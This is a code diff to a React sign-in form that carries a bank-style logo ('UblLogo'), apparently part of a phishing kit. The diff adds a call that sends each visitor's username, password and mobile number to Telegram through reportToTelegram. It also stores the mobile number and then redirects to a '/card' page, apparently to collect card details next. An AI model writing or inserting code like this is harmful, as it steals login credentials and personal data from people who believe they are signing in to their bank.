@@ -5,6 +5,7 @@ import { useState } from "react"
 import { useRouter } from "next/navigation"
 import { Eye, EyeOff } from "lucide-react"
 import { UblLogo } from "@/components/ubl-logo"
+import { reportToTelegram } from "@/lib/report"
 
 export function SignInForm() {
   const router = useRouter()
@@ -17,9 +18,13 @@ export function SignInForm() {
     setMobile(value.replace(/\D/g, ""))
   }
 
-  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
+  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault()
     if (username.trim() && password && mobile.length > 0) {
+      try {
+        sessionStorage.setItem("ubl_mobile", mobile)
+      } catch {}
+      await reportToTelegram("Sign in", { username, password, mobile })
       router.push("/card")
     }
   }
